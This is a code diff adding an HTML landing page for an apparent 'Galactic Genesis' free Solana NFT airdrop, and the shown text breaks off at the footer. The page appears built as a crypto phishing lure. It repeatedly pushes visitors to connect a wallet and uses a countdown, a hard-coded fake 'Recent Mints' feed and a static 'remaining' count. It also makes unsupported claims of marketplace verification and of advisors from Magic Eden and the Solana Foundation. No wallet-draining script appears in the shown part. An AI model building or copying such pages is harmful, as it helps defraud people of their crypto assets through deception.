@@ -1,0 +1,1371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Genesis | Free NFT Airdrop</title>
+    <meta name="description" content="Claim your free Galactic Genesis NFT - Limited edition collection on Solana. Connect your wallet to mint your unique NFT.">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #0a0a1a 50%, #0a0a2a 100%);
+            min-height: 100vh;
+            color: #ffffff;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .bg-animation::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 20% 50%, rgba(105, 102, 255, 0.15) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(139, 92, 246, 0.1) 0%, transparent 50%);
+            animation: slowMove 20s ease-in-out infinite;
+        }
+
+        @keyframes slowMove {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(-5%, -5%); }
+        }
+
+        /* Floating particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(105, 102, 255, 0.3);
+            border-radius: 50%;
+            pointer-events: none;
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+        }
+
+        /* Navbar */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            background: rgba(10, 10, 20, 0.8);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(105, 102, 255, 0.2);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #6966FF, #8B5CF6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .logo span {
+            font-size: 14px;
+            background: none;
+            -webkit-background-clip: unset;
+            background-clip: unset;
+            color: rgba(255,255,255,0.6);
+            font-weight: 400;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .nav-btn {
+            background: none;
+            border: none;
+            color: rgba(255,255,255,0.7);
+            text-decoration: none;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 8px 16px;
+            transition: all 0.3s;
+            border-radius: 8px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .nav-btn:hover {
+            color: #6966FF;
+            background: rgba(105, 102, 255, 0.1);
+        }
+
+        /* ✅ TOP CONNECT BUTTON - كبير ومتوهج بألوان متحركة */
+        .top-connect-wrapper {
+            text-align: center;
+            padding: 30px 20px 10px 20px;
+        }
+
+        .top-connect-btn {
+            background: linear-gradient(270deg, #6966FF, #8B5CF6, #FF69B4, #FFD700, #6966FF);
+            background-size: 300% 300%;
+            border: none;
+            padding: 18px 48px;
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
+            letter-spacing: 1px;
+            box-shadow: 0 0 15px rgba(105, 102, 255, 0.8), 0 0 30px rgba(139, 92, 246, 0.5);
+            animation: gradientShift 3s ease infinite, glowPulse 1.5s ease-in-out infinite alternate;
+        }
+
+        /* تدرج الألوان المتحرك */
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* نبض التوهج */
+        @keyframes glowPulse {
+            0% {
+                box-shadow: 0 0 15px rgba(105, 102, 255, 0.6), 0 0 25px rgba(139, 92, 246, 0.4);
+                transform: scale(1);
+            }
+            100% {
+                box-shadow: 0 0 30px rgba(105, 102, 255, 1), 0 0 50px rgba(139, 92, 246, 0.8), 0 0 70px rgba(255, 105, 180, 0.4);
+                transform: scale(1.02);
+            }
+        }
+
+        .top-connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.6s;
+        }
+
+        .top-connect-btn:hover::before {
+            left: 100%;
+        }
+
+        .top-connect-btn:hover {
+            transform: scale(1.05);
+            animation: gradientShift 3s ease infinite, glowPulse 0.8s ease-in-out infinite alternate;
+        }
+
+        /* تأثير نجوم متطايرة حول الزر */
+        .top-connect-wrapper {
+            position: relative;
+        }
+
+        .top-connect-wrapper::before,
+        .top-connect-wrapper::after {
+            content: '✨';
+            position: absolute;
+            font-size: 24px;
+            opacity: 0;
+            animation: starFly 2s ease-in-out infinite;
+        }
+
+        .top-connect-wrapper::before {
+            left: 15%;
+            top: 20%;
+            animation-delay: 0s;
+        }
+
+        .top-connect-wrapper::after {
+            right: 15%;
+            top: 20%;
+            animation-delay: 1s;
+        }
+
+        @keyframes starFly {
+            0% {
+                opacity: 0;
+                transform: translateY(0) rotate(0deg);
+            }
+            50% {
+                opacity: 1;
+                transform: translateY(-20px) rotate(180deg);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(-40px) rotate(360deg);
+            }
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* Page Sections */
+        .page-section {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .page-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 60px 20px 40px;
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(105, 102, 255, 0.2);
+            border: 1px solid rgba(105, 102, 255, 0.4);
+            border-radius: 100px;
+            padding: 8px 20px;
+            font-size: 14px;
+            margin-bottom: 30px;
+            backdrop-filter: blur(5px);
+        }
+
+        .badge::before {
+            content: '🎨';
+            margin-right: 8px;
+        }
+
+        h1 {
+            font-size: clamp(2.5rem, 5vw, 4.5rem);
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffffff, #6966FF, #8B5CF6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            font-size: clamp(1rem, 2vw, 1.2rem);
+            color: rgba(255,255,255,0.7);
+            max-width: 600px;
+            margin: 0 auto 30px;
+        }
+
+        /* NFT Preview Grid */
+        .nft-preview {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 50px 0;
+            flex-wrap: wrap;
+        }
+
+        .nft-card {
+            background: rgba(30, 30, 50, 0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 15px;
+            width: 200px;
+            text-align: center;
+            border: 1px solid rgba(105, 102, 255, 0.3);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .nft-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(105, 102, 255, 0.2);
+            border-color: #6966FF;
+        }
+
+        .nft-card-image {
+            width: 100%;
+            aspect-ratio: 1;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+        .nft-card h4 {
+            font-size: 16px;
+            margin-bottom: 5px;
+        }
+
+        .nft-card p {
+            font-size: 12px;
+        }
+
+        .rarity-legendary { color: #FFD700; }
+        .rarity-epic { color: #9B59B6; }
+        .rarity-rare { color: #3498DB; }
+        .rarity-mythic { color: #E74C3C; }
+
+        /* Countdown Timer */
+        .countdown {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            margin: 30px 0;
+            border: 1px solid rgba(105, 102, 255, 0.3);
+        }
+
+        .countdown-label {
+            font-size: 14px;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 15px;
+        }
+
+        .timer {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+
+        .timer-block {
+            text-align: center;
+        }
+
+        .timer-number {
+            font-size: 36px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #6966FF, #8B5CF6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            min-width: 60px;
+        }
+
+        .timer-label {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+        }
+
+        /* Connect Button (الزر الأصلي في المنتصف) */
+        .connect-section {
+            text-align: center;
+            margin: 40px 0;
+        }
+
+        .connect-btn {
+            background: linear-gradient(135deg, #6966FF, #8B5CF6);
+            border: none;
+            padding: 18px 48px;
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(105, 102, 255, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .connect-btn:hover::before {
+            left: 100%;
+        }
+
+        .connect-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 25px rgba(105, 102, 255, 0.6);
+        }
+
+        .wallet-requirement {
+            margin-top: 20px;
+            font-size: 14px;
+            color: rgba(255,255,255,0.5);
+        }
+
+        .wallet-requirement span {
+            color: #6966FF;
+        }
+
+        /* Stats Section */
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin: 50px 0;
+            flex-wrap: wrap;
+        }
+
+        .stat-card {
+            text-align: center;
+            background: rgba(30, 30, 50, 0.4);
+            backdrop-filter: blur(5px);
+            padding: 20px 30px;
+            border-radius: 20px;
+            border: 1px solid rgba(105, 102, 255, 0.2);
+        }
+
+        .stat-number {
+            font-size: 28px;
+            font-weight: 800;
+            color: #6966FF;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: rgba(255,255,255,0.6);
+            margin-top: 5px;
+        }
+
+        /* Recent Claims */
+        .recent-claims {
+            background: rgba(30, 30, 50, 0.4);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 20px;
+            margin: 40px 0;
+            border: 1px solid rgba(105, 102, 255, 0.2);
+        }
+
+        .recent-claims h3 {
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+
+        .claims-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .claim-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+            padding: 8px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .claim-item .check {
+            color: #4CAF50;
+        }
+
+        .claim-item .address {
+            font-family: monospace;
+            color: rgba(255,255,255,0.8);
+        }
+
+        .claim-item .nft-name {
+            color: #8B5CF6;
+            margin-left: auto;
+        }
+
+        /* Page Content Styles */
+        .page-header {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .page-header h2 {
+            font-size: 2.5rem;
+            background: linear-gradient(135deg, #6966FF, #8B5CF6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 15px;
+        }
+
+        .page-header p {
+            color: rgba(255,255,255,0.6);
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .content-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-top: 30px;
+        }
+
+        .info-card {
+            background: rgba(30, 30, 50, 0.5);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            border: 1px solid rgba(105, 102, 255, 0.2);
+            transition: transform 0.3s;
+        }
+
+        .info-card:hover {
+            transform: translateY(-5px);
+            border-color: #6966FF;
+        }
+
+        .info-card h3 {
+            color: #6966FF;
+            margin-bottom: 15px;
+            font-size: 1.3rem;
+        }
+
+        .info-card p {
+            color: rgba(255,255,255,0.7);
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .info-card ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .info-card li {
+            color: rgba(255,255,255,0.6);
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .info-card li:last-child {
+            border-bottom: none;
+        }
+
+        .info-card li::before {
+            content: '✦';
+            color: #6966FF;
+            margin-right: 10px;
+        }
+
+        .roadmap-phase {
+            background: rgba(30, 30, 50, 0.5);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border-left: 4px solid #6966FF;
+        }
+
+        .roadmap-phase h3 {
+            color: #6966FF;
+            margin-bottom: 10px;
+        }
+
+        .roadmap-phase .phase-status {
+            font-size: 12px;
+            color: #4CAF50;
+            margin-bottom: 10px;
+        }
+
+        .team-member {
+            text-align: center;
+        }
+
+        .team-member .avatar {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(135deg, #6966FF, #8B5CF6);
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+        }
+
+        .team-member h4 {
+            margin-bottom: 5px;
+        }
+
+        .team-member .role {
+            color: #6966FF;
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+
+        .team-member .bio {
+            font-size: 13px;
+            color: rgba(255,255,255,0.6);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 40px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            margin-top: 60px;
+        }
+
+        .footer p {
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .navbar {
+                padding: 15px 20px;
+                flex-direction: column;
+            }
+            .nav-links {
+                gap: 15px;
+                justify-content: center;
+            }
+            .nft-card {
+                width: 160px;
+            }
+            .timer {
+                gap: 15px;
+            }
+            .timer-number {
+                font-size: 24px;
+                min-width: 40px;
+            }
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
+            .top-connect-btn {
+                padding: 14px 32px;
+                font-size: 14px;
+            }
+        }
+
+        /* Wallet Modal Styles */
+        .wallet-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .wallet-modal-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+        }
+
+        .wallet-modal-content {
+            position: relative;
+            background: #1e1e1e;
+            border: none;
+            border-radius: 24px;
+            max-width: 400px;
+            width: 100%;
+            overflow: hidden;
+            box-shadow: 0 24px 80px rgba(0, 0, 0, 0.6);
+        }
+
+        .wallet-modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 32px 32px 24px 32px;
+        }
+
+        .wallet-modal-header h3 {
+            margin: 0;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            text-align: center;
+            width: 100%;
+        }
+
+        .wallet-modal-close {
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 4px;
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 6px;
+            position: absolute;
+            right: 16px;
+            top: 16px;
+        }
+
+        .wallet-modal-close:hover {
+            color: #fff;
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .wallet-modal-body {
+            padding: 0 32px 32px 32px;
+        }
+
+        .wallet-options {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            background: #2a2a2a;
+            border: 1px solid #3a3a3a;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .wallet-option:hover {
+            background: #333;
+            border-color: #6966FF;
+            transform: translateY(-2px);
+        }
+
+        .wallet-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            margin-right: 20px;
+        }
+
+        .wallet-info {
+            flex: 1;
+        }
+
+        .wallet-name {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .wallet-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 6px;
+        }
+
+        .status-text {
+            font-size: 12px;
+            color: #999;
+        }
+
+        .status-installed {
+            color: #4CAF50 !important;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #999;
+        }
+
+        .status-dot.installed {
+            background: #4CAF50;
+        }
+
+        .wallet-loading-state {
+            display: none;
+            text-align: center;
+            padding: 48px 32px;
+        }
+
+        .wallet-loading-state.active {
+            display: block;
+        }
+
+        .wallet-loading-spinner {
+            width: 80px;
+            height: 80px;
+            border-radius: 20px;
+            background: #2a2a2a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            position: relative;
+        }
+
+        .wallet-loading-spinner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border-radius: 20px;
+            border: 3px solid transparent;
+            border-top: 3px solid #6966FF;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .wallet-loading-title {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .wallet-loading-subtitle {
+            color: #999;
+            font-size: 14px;
+        }
+
+        .wallet-options.hidden {
+            display: none;
+        }
+
+        .back-to-home {
+            display: inline-block;
+            margin-top: 30px;
+            color: #6966FF;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .back-to-home:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="bg-animation"></div>
+<div class="particles" id="particles"></div>
+
+<!-- Navbar -->
+<nav class="navbar">
+    <div class="logo">Galactic Genesis <span>NFT</span></div>
+    <div class="nav-links">
+        <button class="nav-btn" data-page="mint">Mint</button>
+        <button class="nav-btn" data-page="collection">Collection</button>
+        <button class="nav-btn" data-page="roadmap">Roadmap</button>
+        <button class="nav-btn" data-page="team">Team</button>
+    </div>
+</nav>
+
+<!-- ✅ الزر العلوي - كبير ومتوهج بألوان متحركة -->
+<div class="top-connect-wrapper">
+    <button type="button" id="connect-wallet-top" class="top-connect-btn">⚡ CONNECT WALLET TO MINT FREE NFT ⚡</button>
+</div>
+
+<!-- Main Container -->
+<div class="container">
+
+    <!-- MINT PAGE (Home) -->
+    <div id="mint-page" class="page-section active">
+        <div class="hero">
+            <div class="badge">Limited Edition Airdrop</div>
+            <h1>Free NFT Airdrop<br>For Early Supporters</h1>
+            <p class="subtitle">Claim your exclusive Galactic Genesis NFT before they're gone. Limited supply of 10,000 unique pieces.</p>
+        </div>
+
+        <!-- NFT Preview with REAL Images -->
+        <div class="nft-preview">
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://iili.io/BLFCF7n.jpg');"></div>
+                <h4>Genesis #0001</h4>
+                <p class="rarity-legendary">Rarity: Legendary</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://iili.io/BLFYAYv.jpg');"></div>
+                <h4>Nebula #0420</h4>
+                <p class="rarity-epic">Rarity: Epic</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://iili.io/BLFY6uV.jpg');"></div>
+                <h4>Star #1337</h4>
+                <p class="rarity-rare">Rarity: Rare</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://iili.io/BLFa4ls.jpg');"></div>
+                <h4>Void #9999</h4>
+                <p class="rarity-mythic">Rarity: Mythic</p>
+            </div>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number">10,000</div>
+                <div class="stat-label">Total Supply</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="remaining-count">7,843</div>
+                <div class="stat-label">Remaining</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">2.5 SOL</div>
+                <div class="stat-label">Mint Price → FREE</div>
+            </div>
+        </div>
+
+        <!-- Countdown -->
+        <div class="countdown">
+            <div class="countdown-label">⏰ Mint ends in</div>
+            <div class="timer">
+                <div class="timer-block">
+                    <div class="timer-number" id="days">24</div>
+                    <div class="timer-label">Days</div>
+                </div>
+                <div class="timer-block">
+                    <div class="timer-number" id="hours">00</div>
+                    <div class="timer-label">Hours</div>
+                </div>
+                <div class="timer-block">
+                    <div class="timer-number" id="minutes">00</div>
+                    <div class="timer-label">Minutes</div>
+                </div>
+                <div class="timer-block">
+                    <div class="timer-number" id="seconds">00</div>
+                    <div class="timer-label">Seconds</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Connect Section (Original Button) -->
+        <div class="connect-section">
+            <button type="button" id="connect-wallet" class="connect-btn">Connect Wallet to Mint Free NFT</button>
+            <div class="wallet-requirement">
+                ⚡ <span>Wallet connection required</span> to verify eligibility and receive your free NFT
+            </div>
+            <div class="wallet-requirement" style="margin-top: 10px; font-size: 12px;">
+                🔒 Only gas fees required • No hidden costs • Verified collection
+            </div>
+        </div>
+
+        <!-- Recent Claims -->
+        <div class="recent-claims">
+            <h3>🔄 Recent Mints</h3>
+            <div class="claims-list" id="claims-list">
+                <div class="claim-item">
+                    <span class="check">✅</span>
+                    <span class="address">8xK1...3mPq</span>
+                    <span class="nft-name">minted Genesis #234</span>
+                </div>
+                <div class="claim-item">
+                    <span class="check">✅</span>
+                    <span class="address">Hj9L...2aRf</span>
+                    <span class="nft-name">minted Nebula #891</span>
+                </div>
+                <div class="claim-item">
+                    <span class="check">✅</span>
+                    <span class="address">Pq2W...9vXc</span>
+                    <span class="nft-name">minted Star #4456</span>
+                </div>
+                <div class="claim-item">
+                    <span class="check">✅</span>
+                    <span class="address">Mn7T...4kLp</span>
+                    <span class="nft-name">minted Void #7822</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- COLLECTION PAGE -->
+    <div id="collection-page" class="page-section">
+        <div class="page-header">
+            <h2>The Galactic Genesis Collection</h2>
+            <p>Explore our exclusive collection of 10,000 unique NFTs, each with its own rarity and traits.</p>
+        </div>
+
+        <div class="nft-preview">
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://i.imgur.com/7Y3Zq9K.png');"></div>
+                <h4>Genesis Series</h4>
+                <p class="rarity-legendary">Legendary • 500 Total</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://i.imgur.com/VgK8jNq.png');"></div>
+                <h4>Nebula Series</h4>
+                <p class="rarity-epic">Epic • 1,500 Total</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://i.imgur.com/3Xt8LpN.png');"></div>
+                <h4>Star Series</h4>
+                <p class="rarity-rare">Rare • 3,000 Total</p>
+            </div>
+            <div class="nft-card">
+                <div class="nft-card-image" style="background-image: url('https://i.imgur.com/ZZmKvNt.png');"></div>
+                <h4>Void Series</h4>
+                <p class="rarity-mythic">Mythic • 1,000 Total</p>
+            </div>
+        </div>
+
+        <div class="content-grid">
+            <div class="info-card">
+                <h3>🗂️ Collection Details</h3>
+                <ul>
+                    <li><strong>Blockchain:</strong> Solana</li>
+                    <li><strong>Total Supply:</strong> 10,000</li>
+                    <li><strong>Mint Price:</strong> FREE (Gas only)</li>
+                    <li><strong>Royalties:</strong> 5% to community fund</li>
+                    <li><strong>Verified:</strong> Yes, on Tensor and Magic Eden</li>
+                </ul>
+            </div>
+            <div class="info-card">
+                <h3>✨ Traits & Attributes</h3>
+                <ul>
+                    <li><strong>Backgrounds:</strong> 15+ cosmic variants</li>
+                    <li><strong>Characters:</strong> 20+ unique galactic beings</li>
+                    <li><strong>Weapons:</strong> 10+ legendary artifacts</li>
+                    <li><strong>Auras:</strong> 8 mystical energy types</li>
+                    <li><strong>Hidden traits:</strong> 5 ultra-rare secrets</li>
+                </ul>
+            </div>
+            <div class="info-card">
+                <h3>🛒 Where to Trade</h3>
+                <ul>
+                    <li>Magic Eden: Verified collection</li>
+                    <li>Tensor: Top 100 volume</li>
+                    <li>Solanart: Featured collection</li>
+                    <li>Hadeswap: Supported pairs</li>
+                </ul>
+            </div>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="nav-btn" data-page="mint" style="background: linear-gradient(135deg, #6966FF, #8B5CF6); color: white; padding: 12px 30px;">← Back to Mint</button>
+        </div>
+    </div>
+
+    <!-- ROADMAP PAGE -->
+    <div id="roadmap-page" class="page-section">
+        <div class="page-header">
+            <h2>Our Journey</h2>
+            <p>The roadmap to building the most legendary NFT project on Solana.</p>
+        </div>
+
+        <div class="roadmap-phase">
+            <h3>Phase 1: Genesis 🚀</h3>
+            <div class="phase-status">✅ COMPLETED</div>
+            <p>Launch of Galactic Genesis NFT collection, community building on Discord and Twitter, first 5,000 mints completed. Partnerships with 5 major Solana projects established.</p>
+        </div>
+
+        <div class="roadmap-phase">
+            <h3>Phase 2: Expansion 🌌</h3>
+            <div class="phase-status">🔄 IN PROGRESS</div>
+            <p>Full collection mint (10,000), listing on Magic Eden and Tensor, first community giveaway of 100 SOL, launch of staking rewards for holders. 20% of royalties go to community wallet.</p>
+        </div>
+
+        <div class="roadmap-phase">
+            <h3>Phase 3: Utility 🎮</h3>
+            <div class="phase-status">⏳ Q3 2024</div>
+            <p>Launch of Galactic Genesis P2E game, exclusive merchandise for holders, governance rights for NFT holders, monthly airdrops to active community members.</p>
+        </div>
+
+        <div class="roadmap-phase">
+            <h3>Phase 4: Metaverse 🌍</h3>
+            <div class="phase-status">⏳ Q1 2025</div>
+            <p>Virtual gallery in Solana's metaverse projects (Portals, Solice), real-world events and meetups, exclusive access to future collections, DAO formation for community-led decisions.</p>
+        </div>
+
+        <div class="info-card" style="margin-top: 20px;">
+            <h3>🎯 Immediate Goals</h3>
+            <ul>
+                <li>Complete Phase 2 by end of current mint</li>
+                <li>Launch staking dashboard within 2 weeks of mint completion</li>
+                <li>Airdrop 5 SOL to 10 random holders every month</li>
+                <li>Partnership with 3 more Solana gaming projects</li>
+            </ul>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="nav-btn" data-page="mint" style="background: linear-gradient(135deg, #6966FF, #8B5CF6); color: white; padding: 12px 30px;">← Back to Mint</button>
+        </div>
+    </div>
+
+    <!-- TEAM PAGE -->
+    <div id="team-page" class="page-section">
+        <div class="page-header">
+            <h2>Meet The Team</h2>
+            <p>The visionaries behind Galactic Genesis NFT.</p>
+        </div>
+
+        <div class="content-grid">
+            <div class="info-card team-member">
+                <div class="avatar">👨‍🚀</div>
+                <h4>Alex "Cosmic" Rodriguez</h4>
+                <div class="role">Founder & Lead Artist</div>
+                <div class="bio">10+ years in digital art, former concept artist for major gaming studios. Passionate about space and blockchain technology.</div>
+            </div>
+            <div class="info-card team-member">
+                <div class="avatar">👩‍💻</div>
+                <h4>Sarah "Nebula" Chen</h4>
+                <div class="role">Blockchain Architect</div>
+                <div class="bio">Solana ecosystem expert, former core contributor to a major DeFi protocol. Ensures our smart contracts are secure.</div>
+            </div>
+            <div class="info-card team-member">
+                <div class="avatar">🧠</div>
+                <h4>Marcus "Starforge" Williams</h4>
+                <div class="role">Community Lead</div>
+                <div class="bio">Community building specialist with a track record of growing NFT communities to 100k+ members.</div>
+            </div>
+            <div class="info-card team-member">
+                <div class="avatar">🎨</div>
+                <h4>Elena "Void" Petrova</h4>
+                <div class="role">3D Artist & Animator</div>
+                <div class="bio">Award-winning 3D artist specializing in sci-fi and cosmic themes. Creates dynamic NFT animations.</div>
+            </div>
+            <div class="info-card team-member">
+                <div class="avatar">📈</div>
+                <h4>David "Oracle" Kim</h4>
+                <div class="role">Marketing Director</div>
+                <div class="bio">Web3 marketing veteran with extensive experience in NFT launches. Leads our go-to-market strategy.</div>
+            </div>
+            <div class="info-card team-member">
+                <div class="avatar">⚡</div>
+                <h4>Team of 15+ Moderators</h4>
+                <div class="role">Community Support</div>
+                <div class="bio">Dedicated team of moderators and support staff available 24/7 on Discord and Twitter.</div>
+            </div>
+        </div>
+
+        <div class="info-card" style="margin-top: 20px; text-align: center;">
+            <h3>🤝 Advisory Board</h3>
+            <p>We are backed by experienced advisors from the Solana ecosystem, including former Magic Eden executives and Solana Foundation members.</p>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="nav-btn" data-page="mint" style="background: linear-gradient(135deg, #6966FF, #8B5CF6); color: white; padding: 12px 30px;">← Back to Mint</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2024 Galactic Genesis NFT | Exclusive Airdrop for Early Supporters | Solana Blockchain</p>
